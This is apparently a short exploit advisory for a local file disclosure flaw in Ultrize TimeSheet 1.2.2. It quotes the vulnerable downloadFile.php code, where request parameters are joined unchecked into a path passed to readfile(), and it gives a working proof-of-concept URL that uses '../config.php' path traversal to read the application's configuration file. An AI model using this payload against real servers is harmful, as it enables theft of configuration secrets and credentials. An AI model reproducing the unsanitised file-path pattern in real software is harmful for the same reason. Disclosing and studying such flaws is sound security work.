Ultrize TimeSheet 1.2.2 readfile() Local File Disclosure Vulnerability
======================================================================



Ultrize TimeSheet 1.2.2 readfile() Local File Disclosure Vulnerability
Code page  /actions/downloadFile.php

====
<?php
//** This script performs the actual file download

$fileName = $_REQUEST[&#039;fileName&#039;]; <--!!
$job_id = $_REQUEST[&#039;job_id&#039;]; <--!!
$fullFile = $config[&#039;upload_dir&#039;].$job_id.&#039;/&#039;.$fileName; <--!!

if (file_exists($fullFile))
{
    header("Content-Type: application/octet-stream");
    header("Content-Length: ".filesize($fullFile));

    header(&#039;Content-Disposition: attachment; fileName="&#039;.$fileName.&#039;"&#039;);

    readfile($fullFile); <--!!
}
else
{
    header("HTTP/1.0 404 Not Found");
    print "<h1>File not found. </h1>";
    print $fileName;
    print "<hr>Please make sure your file paths are correct: {$config[&#039;upload_dir&#039;]}/{$job_id}/$fileName}<br />";
}

?>
====

Poc
/actions/downloadFile.php?fileName=../config.php




